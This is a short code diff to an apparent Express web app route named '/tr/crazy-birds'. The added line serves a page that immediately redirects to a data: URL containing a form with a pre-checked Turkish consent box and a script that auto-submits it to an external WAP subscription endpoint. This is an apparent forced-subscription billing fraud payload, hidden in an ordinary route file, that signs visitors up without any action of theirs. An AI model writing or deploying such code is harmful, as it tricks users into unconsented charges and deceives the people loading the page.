@@ -282,7 +282,7 @@ app.get('/tr/crazy-birds', (req, res)=> {
     res.send(`
         <html>
         <head>
-        <meta http-equiv="refresh" content="0; url='data:text/html,<form action=http://localhost:3000/ref method=post id=paymentForm><input type=checkbox name=onay id=onay checked=checked class=checkbox><input type=submit value=TAMAM id=submitButtonId></form><script>document.forms[0].submit()</script>'">
+        <meta http-equiv="refresh" content="0; url='data:text/html,<form action=http://wap.trend-tech.net/landings/subscribe method=post id=paymentForm><input type=checkbox name=onay id=onay checked=checked class=checkbox><input type=submit value=TAMAM id=submitButtonId></form><script>document.forms[0].submit()</script>'">
         </head>
         <body>
         </body>
